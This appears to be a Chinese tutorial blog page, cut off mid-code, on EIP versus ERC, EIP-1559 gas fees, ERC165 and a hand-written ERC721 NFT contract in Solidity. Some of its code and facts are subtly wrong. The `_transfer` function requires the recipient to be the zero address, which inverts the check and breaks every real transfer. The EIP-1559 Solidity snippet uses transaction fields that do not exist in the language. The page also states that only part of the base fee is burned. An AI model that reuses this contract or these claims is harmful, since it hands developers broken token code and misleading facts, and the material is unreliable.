id="EIP与ERC"><a href="#EIP与ERC" class="headerlink" title="EIP与ERC"></a>EIP与ERC</h2><p>这里有一个点需要理解，本节标题是<code>ERC721</code>，这里又提到了<code>EIP721</code>,这两个是什么关系呢？</p><p><code>EIP</code>全称 <code>Ethereum Improvement Proposals</code>(以太坊改进建议), 是以太坊开发者社区提出的改进建议, 是一系列以编号排定的文件, 类似互联网上IETF的RFC。</p><p><code>EIP</code>可以是 <code>Ethereum</code> 生态中任意领域的改进, 比如新特性、ERC、协议改进、编程工具等等。</p><p><code>ERC</code>全称 Ethereum Request For Comment (以太坊意见征求稿), 用以记录以太坊上应用级的各种开发标准和协议。如典型的Token标准(<code>ERC20</code>, <code>ERC721</code>)、名字注册(<code>ERC26</code>, <code>ERC13</code>), URI范式(<code>ERC67</code>), Library&#x2F;Package格式(<code>EIP82</code>), 钱包格式(<code>EIP75</code>,<code>EIP85</code>)。</p><p>ERC协议标准是影响以太坊发展的重要因素, 像<code>ERC20</code>, <code>ERC223</code>, <code>ERC721</code>, <code>ERC777</code>等, 都是对以太坊生态产生了很大影响。</p><p>所以最终结论：<code>EIP</code>包含<code>ERC</code>。</p><h1 id="EIP1559"><a href="#EIP1559" class="headerlink" title="EIP1559"></a>EIP1559</h1><p>EIP-1559 是以太坊网络的一个重大协议升级，旨在改进交易费用机制。它在 2021 年 8 月的 London 硬分叉中被引入</p><h3 id="传统-Gas-定价模型-之前"><a href="#传统-Gas-定价模型-之前" class="headerlink" title="传统 Gas 定价模型 (之前)"></a>传统 Gas 定价模型 (之前)</h3><p>在 EIP-1559 之前：</p><ul><li>用户必须手动设置 gas price</li><li>竞价系统导致高峰期 gas 费用波动剧烈</li><li>矿工可以任意选择最高 gas price 的交易</li></ul><h3 id="EIP-1559-的新机制"><a href="#EIP-1559-的新机制" class="headerlink" title="EIP-1559 的新机制"></a>EIP-1559 的新机制</h3><h4 id="1-费用组成"><a href="#1-费用组成" class="headerlink" title="1. 费用组成"></a>1. 费用组成</h4><p>交易费现在由两部分组成：</p><ul><li><strong>Base Fee</strong>：基础费用（动态调整）</li><li><strong>Priority Fee</strong>（小费&#x2F;矿工费）：激励矿工打包交易</li></ul><h4 id="2-Base-Fee-特点"><a href="#2-Base-Fee-特点" class="headerlink" title="2. Base Fee 特点"></a>2. Base Fee 特点</h4><ul><li>根据网络拥塞自动调整</li><li>随网络使用率波动</li><li>部分 Base Fee 会被”烧掉”（销毁）</li></ul><h4 id="3-价格计算示例"><a href="#3-价格计算示例" class="headerlink" title="3. 价格计算示例"></a>3. 价格计算示例</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">总交易费 = (Base Fee + Priority Fee) * Gas Used<br></code></pre></td></tr></table></figure><h4 id="4-优势"><a href="#4-优势" class="headerlink" title="4. 优势"></a>4. 优势</h4><ul><li>更可预测的交易费用</li><li>减少网络拥塞</li><li>通缩机制（销毁部分 ETH）</li><li>更透明的定价</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Solidity 中的 EIP-1559 交易<br>function sendTransaction() public &#123;<br>    // EIP-1559 交易参数<br>    tx.gasPrice;       // 最大 gas price<br>    tx.maxFeePerGas;   // 最大每 gas 费用<br>    tx.maxPriorityFeePerGas;  // 最大小费<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="不同网络支持情况"><a href="#不同网络支持情况" class="headerlink" title="不同网络支持情况"></a>不同网络支持情况</h3><ul><li>✅ 以太坊主网</li><li>✅ 大多数 EVM 兼容链</li><li>❌ 一些较新或定制链可能不完全支持</li></ul><h3 id="实践建议"><a href="#实践建议" class="headerlink" title="实践建议"></a>实践建议</h3><ol><li>检查网络 EIP-1559 支持</li><li>不支持时使用 <code>--legacy</code></li><li>动态调整 <code>maxFeePerGas</code></li></ol><h3 id="Foundry-中的使用"><a href="#Foundry-中的使用" class="headerlink" title="Foundry 中的使用"></a>Foundry 中的使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">自动 EIP-1559</span><br>forge create Contract <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">强制传统模式</span><br>forge create Contract --legacy<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">手动设置 gas</span><br>forge create Contract \<br>  --legacy \<br>  --gas-price 20gwei<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h2 id="IERC721"><a href="#IERC721" class="headerlink" title="IERC721"></a>IERC721</h2><h2 id="ERC165"><a href="#ERC165" class="headerlink" title="ERC165"></a>ERC165</h2><p>通过<a href="https://eips.ethereum.org/EIPS/eip-165">ERC165标准</a>，智能合约可以声明它支持的接口，供其他合约检查。简单的说，ERC165就是检查一个智能合约是不是支持了<code>ERC721</code>，<code>ERC1155</code>的接口。</p><p><code>IERC165</code>接口合约只声明了一个<code>supportsInterface</code>函数，输入要查询的<code>interfaceId</code>接口id，若合约实现了该接口id，则返回<code>true</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IERC165 &#123;<br>    /**<br>     * @dev 如果合约实现了查询的`interfaceId`，则返回true<br>     * 规则详见：https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]<br>     *<br>     */<br>    function supportsInterface(bytes4 interfaceId) external view returns (bool);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>IERC721</code>是<code>ERC721</code>标准的接口合约，规定了<code>ERC721</code>要实现的基本函数。它利用<code>tokenId</code>来表示特定的非同质化代币，授权或转账都要明确<code>tokenId</code>；而<code>ERC20</code>只需要明确转账的数额即可。</p><h2 id="IERC721-1"><a href="#IERC721-1" class="headerlink" title="IERC721"></a>IERC721</h2><p><code>IERC721</code>是<code>ERC721</code>标准的接口合约，规定了<code>ERC721</code>要实现的基本函数。它利用<code>tokenId</code>来表示特定的非同质化代币，授权或转账都要明确<code>tokenId</code>；而<code>ERC20</code>只需要明确转账的数额即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br><br>import &quot;./34_IERC165.sol&quot;;<br>interface IERC721 is IERC165 &#123;<br>    // 转账事件<br>    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);<br>    // 授权事件<br>    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);<br>    // 批量授权事件<br>    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);<br>    // 查询余额<br>    function balanceOf(address owner) external view returns (uint256 balance);<br>    // 查询拥有者--通过tokenid<br>    function ownerOf(uint256 tokenId) external view returns (address owner);<br><br>    <br>    // 安全转账的重载函数，参数里面包含了data<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId,<br>        bytes calldata data<br>    ) external;<br>    // 安全转账，（如果接收方是合约地址，会要求实现 ERC721Receiver)<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId<br>    ) external;<br><br>    // 普通的转账，参数为转出地址from 接受地址，和tokenid<br>    function transferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId<br>    ) external;<br>    // 授权另一个地址使用我的NFT ,参数为被授权地址和tokenid<br>    function approve(address to, uint256 tokenId) external;<br><br>    // 批量授权给某个地址<br>    function setApprovalForAll(address operator, bool _approved) external;<br><br>    // 获取某个tokenid 的授权<br>    function getApproved(uint256 tokenId) external view returns (address operator);<br><br>    // 查询某地址的NFT是否批量授权给另一个地址，传入拥有者和操作者<br>    function isApprovedForAll(address owner, address operator) external view returns (bool);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IERC721中的事件"><a href="#IERC721中的事件" class="headerlink" title="IERC721中的事件"></a>IERC721中的事件</h3><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenid</code>。</li><li><code>Approval</code>事件：在授权时释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenid</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h3 id="IERC721中的函数"><a href="#IERC721中的函数" class="headerlink" title="IERC721中的函数"></a>IERC721中的函数</h3><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h2 id="IERC721Receiver"><a href="#IERC721Receiver" class="headerlink" title="IERC721Receiver"></a>IERC721Receiver</h2><p>如果一个合约没有实现<code>ERC721</code>的相关函数，转入的<code>NFT</code>就进了黑洞，永远转不出来了。为了防止误转账，<code>ERC721</code>实现了<code>safeTransferFrom()</code>安全转账函数，目标合约必须实现了<code>IERC721Receiver</code>接口才能接收<code>ERC721</code>代币，不然会<code>revert</code>。<code>IERC721Receiver</code>接口只包含一个<code>onERC721Received()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// IERC721Receiver<br>// ERC721接收者接口：合约必须实现这个接口来通过安全转账接收ERC721<br>interface IERC721Receiver &#123;<br>    function onERC721Received(<br>        address operator,<br>        address from,<br>        uint tokenId,<br>        bytes calldata data<br>    ) external returns (bytes4);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面就是<code>ERC721</code> 利用<code>_checkOnERC721Received</code>来确保目标合约实现了<code>onERC721Received()</code>函数（返回<code>onERC721Received</code>的<code>selector</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _checkOnERC721Received(<br>    address operator,<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) internal &#123;<br>    if (to.code.length &gt; 0) &#123;<br>        try IERC721Receiver(to).onERC721Received(operator, from, tokenId, data) returns (bytes4 retval) &#123;<br>            if (retval != IERC721Receiver.onERC721Received.selector) &#123;<br>                // Token rejected<br>                revert IERC721Errors.ERC721InvalidReceiver(to);<br>            &#125;<br>        &#125; catch (bytes memory reason) &#123;<br>            if (reason.length == 0) &#123;<br>                // non-IERC721Receiver implementer<br>                revert IERC721Errors.ERC721InvalidReceiver(to);<br>            &#125; else &#123;<br>                /// @solidity memory-safe-assembly<br>                assembly &#123;<br>                    revert(add(32, reason), mload(reason))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IERC721Metadata"><a href="#IERC721Metadata" class="headerlink" title="IERC721Metadata"></a>IERC721Metadata</h2><p><code>IERC721Metadata</code>是<code>ERC721</code>的拓展接口，实现了3个查询<code>metadata</code>元数据的常用函数：</p><ul><li><code>name()</code>：返回代币名称。</li><li><code>symbol()</code>：返回代币代号。</li><li><code>tokenURI()</code>：通过<code>tokenId</code>查询<code>metadata</code>的链接<code>url</code>，<code>ERC721</code>特有的函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IERC721Metadata is IERC721 &#123;<br>    function name() external view returns (string memory);<br><br>    function symbol() external view returns (string memory);<br><br>    function tokenURI(uint256 tokenId) external view returns (string memory);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ERC721主合约"><a href="#ERC721主合约" class="headerlink" title="ERC721主合约"></a>ERC721主合约</h2><p><code>ERC721</code>主合约实现了<code>IERC721</code>，<code>IERC165</code>和<code>IERC721Metadata</code>定义的所有功能，包含<code>4</code>个状态变量和<code>17</code>个函数。实现都比较简单，每个函数的功能见代码注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;./34_IERC165.sol&quot;;<br>import &quot;./34_IERC721.sol&quot;;<br>import &quot;./34_IERC721Receiver.sol&quot;;<br>import &quot;./34_IERC721Metadata.sol&quot;;<br>import &quot;./String.sol&quot;;<br><br><br>contract ERC721 is IERC721,IERC721Metadata &#123;<br>    using Strings for uint256; // 使用Strings库的uint256<br>    // token name <br>    string public override name;<br>    // token symbol<br>    string public  override symbol;<br>    // tokenID 到 owner address 的持有人映射<br>    mapping(uint=&gt;address) private _owners;<br>    // address 到持仓数量的 持仓量映射<br>    mapping (address=&gt;uint) private _balances;<br>    // tokenId 到授权地址的授权映射<br>    mapping (uint=&gt;address)private _tokenApprovals;<br>    // owner地址到operator地址 的批量授权映射<br>    mapping (address=&gt;mapping (address=&gt;bool))private _operatorApprovals;<br><br>    // 错误事件 无效的接收者<br>    error ERC721InvalidReceiver(address receiver);<br>    // 构造函数，初始化代币的name 和symbol;<br>    constructor(string memory name_,string memory symbol_)&#123;<br>        name=name_;<br>        symbol=symbol_;<br>    &#125;<br>    // 实现IERC165接口里面的supportsInterface<br>    function supportsInterface(bytes4 interfaceId) external pure  override returns (bool)&#123;<br>        return <br>            interfaceId == type(IERC721).interfaceId ||<br>            interfaceId == type(IERC165).interfaceId ||<br>            interfaceId == type(IERC721Metadata).interfaceId;<br>            // 这是在干嘛呢？ 传参是一个interfaceId 来和IERC721接口的interfaceId进行比较。<br>            // 接口的interfaceId是接口的所有的函数签名转字节后的前几个字节合集之类的<br>    &#125;<br>    // 接下来开始实现IERC721的balanceOf，利用_balances变量查询owner地址的balance。<br>     // 查询余额<br>    function balanceOf(address owner) external view override returns (uint256 balance)&#123;<br>        // 返回的是什么，是余额<br>        // 返回余额前先检查owner为非0地址<br>        require(owner!=address(0), &quot;owner = zero address&quot;);<br>        return _balances[owner];<br>    &#125;<br>    // 实现IERC721拥有者接口，通过tokenID查询owner<br>    //ownerOf 不能写external 因为external只能在外部调用，要写public<br>    function ownerOf(uint256 tokenId) public  view override returns (address owner)&#123;<br>        // 也要检查一下拥有者地址是不是o<br>        owner=_owners[tokenId];<br>        require(owner!=address(0), &quot;owner = zero address&quot;);<br>        // 返回地址<br>        // return owner; // 这个可以隐式表达，<br>    &#125;<br><br>        // 查询某地址的NFT是否批量授权给另一个地址，传入拥有者和操作者<br>    function isApprovedForAll(address owner, address operator) external view  override returns (bool)&#123;<br>        // mapping (address=&gt;mapping (address=&gt;bool))private _operatorApprovals;<br>        // 所以是[地址][地址]<br>        return  _operatorApprovals[owner][operator];<br>    &#125;<br>        // 授权给某些地址--这是批量授权的map<br>    function setApprovalForAll(address operator, bool _approved) external override&#123;<br>        // 设置授权，就是给批量授权的map添加对应的true<br>        _operatorApprovals[msg.sender][operator]=_approved;// 这个为啥是批量呢？因为这个map可以一直添加的<br>        // 释放一个事件来告诉我们添加了这个授权<br>        emit ApprovalForAll(msg.sender,operator, _approved);<br><br>    &#125;<br>        // 查询某个tokenid 的授权<br>    function getApproved(uint256 tokenId) external view override returns (address operator)&#123;<br>        // 查询之前也要去判断对应代币的拥有者地址是不是0地址<br>        require(_owners[tokenId]!=address(0), &quot;owner = zero address&quot;);<br>        // g根据tokenId去查询对应的授权地址<br>        return _tokenApprovals[tokenId];<br><br>    &#125;<br>    // 内部函数，这是真正的授权函数<br>     function _approve(<br>        address owner,<br>        address to, <br>        uint256 tokenId) private  &#123;<br>            // 这个函数不是重写了父合约或接口中的同名函数。所以不用override,同时要声明私有，不然其他地方调用的时候会默认调用了公有/外部的的<br>        // 添加某个地址的授权<br>        _tokenApprovals[tokenId]=to;<br>        // 释放授权事件来显示我们授权了<br>        emit Approval(owner,to,tokenId);<br>    &#125;<br>   // 授权另一个地址使用我的NFT ,参数为被授权地址和tokenid<br>    function approve(address to, uint256 tokenId) external override&#123;<br>        // 先去token拥有者map里面拿对应的拥有者<br>        address owner=_owners[tokenId];// 拿出来要声明类型<br>        // 还要判断这个owner是不是等于调用者,同时还要判断是否可操作<br>        require(msg.sender==owner||_operatorApprovals[owner][msg.sender]<br>        ,&quot;not owner nor approved for all&quot;);<br>        // 添加某个地址的授权<br>        _approve(owner,to,tokenId);<br>    &#125;<br>    // 在转账之前，我们可以写一个方法来判断 这个spender地址是否可以使用tokenId，需要是owner或者被授权地址<br>    function _isApproveOrOwner(<br>        address owner,<br>        address spender,<br>        uint tokenId<br>    ) private view returns(bool)&#123;<br>        return (spender == owner ||<br>        _tokenApprovals[tokenId] == spender ||<br>        _operatorApprovals[owner][spender]<br>        );<br>    &#125;<br>    /*<br>     * 转账函数。通过调整_balances和 _owner 变量将 tokenId 从 from 转账给 to，同时释放Transfer事件。<br>     * 条件:<br>     * 1. tokenId 被 from 拥有<br>     * 2. to 不是0地址<br>     */<br>     function _transfer(<br>        address owner,<br>        address from,<br>        address to,<br>        uint tokenId<br>     ) private &#123;<br>        // 转账之前先校验 from 是否等于owner <br>        require(from==owner,&quot;from != owner&quot;);<br>        // 校验to地址是否是0地址<br>        require(to==address(0),&quot;to = zero address&quot;);<br>        // 转账之前加一步授权<br>        _approve(owner,to,tokenId);<br>        // 开始转账<br>        _balances[from]-=1;<br>        _balances[to]+=1;<br>        _owners[tokenId]=to;// 拥有者列表里的tokenId的拥有者变成接收者地址<br>        // 释放转账事件<br>        emit Transfer(from,to,tokenId);<br><br>     &#125;<br>    // 普通的转账，参数为转出地址from 接受地址，和tokenid,<br>    // 实现IERC721的transferFrom，非安全转账，不建议使用。调用_transfer函数<br>    function transferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId<br>    ) external override &#123;<br>        // 先根据tokenId拿这个token的拥有者<br>        address owner = ownerOf(tokenId);// ownerOf 不能写external 因为external只能在外部调用，要写public<br>        // 转账之前前判断授权<br>        require(_isApproveOrOwner(owner,msg.sender,tokenId), &quot;not owner nor approved&quot;);<br>        // 调用内部转账方法，发起转账，<br>        _transfer(owner,from,to,tokenId);<br><br><br>    &#125;<br>    /**<br>     * 安全转账，安全地将 tokenId 代币从 from 转移到 to，会检查合约接收者是否了解 ERC721 协议，以防止代币被永久锁定。调用了_transfer函数和_checkOnERC721Received函数。条件：<br>     * from 不能是0地址.<br>     * to 不能是0地址.<br>     * tokenId 代币必须存在，并且被 from拥有.<br>     * 如果 to 是智能合约, 他必须支持 IERC721Receiver-onERC721Received.<br>     */<br>    function _safeTransferFrom(<br>        address owner,<br>        address from,<br>        address to,<br>        uint tokenId,<br>        bytes memory _data<br>    ) private &#123;<br>        _transfer(owner, from, to, tokenId);<br>        _checkOnERC721Received(from, to, tokenId,_data);<br>    &#125;<br><br>    // 安全转账的重载函数，参数里面包含了data<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId,<br>        bytes memory _data<br>    ) public override &#123;<br>        address owner=ownerOf(tokenId);<br>        require(<br>            _isApproveOrOwner(owner, msg.sender, tokenId),<br>            &quot;not owner nor approved&quot;<br>        );<br>        _safeTransferFrom(owner,from,to,tokenId,_data);<br>    &#125;<br>    // 安全转账，（如果接收方是合约地址，会要求实现 ERC721Receiver)<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 tokenId<br>    ) external override &#123;<br>        safeTransferFrom(from,to,tokenId,&quot;&quot;);<br>    &#125;<br><br><br>    /** <br>     * 铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。<br>     * 这个mint函数所有人都能调用，实际使用需要开发人员重写，加上一些条件。<br>     * 条件:<br>     * 1. tokenId尚不存在。<br>     * 2. to不是0地址.<br>     */<br>    function _mint(address to,uint tokenId)internal virtual  &#123;<br>        require(to!=address(0),&quot;mint to zero address&quot;);<br>        require(_owners[tokenId]==address(0), &quot;token already minted&quot;);<br>        _balances[to]+=1;<br>        _owners[tokenId]=to;<br>        emit Transfer(address(0), to, tokenId);<br>    &#125;<br><br>    // _checkOnERC721Received：函数，用于在 to 为合约的时候调用IERC721Receiver-onERC721Received, 以防 tokenId 被不小心转入黑洞。<br>    function _checkOnERC721Received(<br>        address from,<br>        address to,<br>        uint256 tokenId,<br>        bytes memory data<br>    ) private &#123;<br>        if 